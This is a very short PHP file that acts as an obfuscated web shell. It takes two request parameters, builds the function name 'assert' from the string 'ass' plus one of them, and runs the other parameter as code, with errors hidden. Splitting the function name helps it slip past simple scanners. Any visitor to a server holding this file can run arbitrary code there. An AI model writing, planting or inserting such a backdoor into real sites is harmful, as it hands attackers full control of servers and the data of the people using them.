<?php

$aa=@$_REQUEST['aa'];

$bb=@$_REQUEST['bb'];

$cc=$aa.$bb;

$dd=str_replace($aa,'',$cc);

$ee="ass".$aa;

@$ee($dd);

?>